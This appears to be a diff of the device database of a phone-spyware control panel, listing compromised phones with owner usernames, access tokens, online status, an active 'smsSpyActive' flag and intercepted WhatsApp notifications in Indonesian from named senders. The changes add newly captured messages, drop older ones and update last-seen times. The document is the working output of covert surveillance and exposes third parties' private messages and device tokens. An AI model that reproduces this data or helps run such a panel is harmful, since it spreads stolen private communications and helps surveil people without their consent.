@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776773139348,
+    "lastSeen": 1776773142612,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎60 pesan dari 35 chat",
+        "time": "21/04 20:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773141558
+      },
       {
         "appName": "WhatsApp",
         "sender": "Fadli Hk",
@@ -4011,14 +4019,6 @@
         "time": "21/04 17:14",
         "pkg": "com.whatsapp",
         "receivedAt": 1776762847753
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Kelvin",
-        "content": "Ada kgk?",
-        "time": "21/04 17:14",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776762847747
       }
     ],
     "galleryPhotos": [],
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3489 pesan dari 23 chat",
+        "time": "21/04 19:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773144323
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (35 pesan): ~ 𝙺𝚢𝚢𝚂𝚝𝚘𝚛𝚎 𝚟𝚜 𝙺𝚎𝚗𝚘𝚗 𝙱𝚊𝚝𝚞 𝙾𝚗𝚕𝚢 [1095]",
@@ -10320,14 +10328,6 @@
         "time": "21/04 18:13",
         "pkg": "com.whatsapp",
         "receivedAt": 1776770016787
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || RULZ STORE KALBAR (610 pesan): ~ K.",
-        "content": "📷 jual jaket tracktop intinya jaket, harga 80 negokan tipis wak (BU) size m cocok buat tb 160 an/170 tok bb 40 an/54 tok, (cod rumah saya pls)",
-        "time": "21/04 18:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776770013736
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776773138644,
+    "lastSeen": 1776773141671,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776773140840,
+    "lastSeen": 1776773143833,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776773141136,
+    "lastSeen": 1776773144134,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
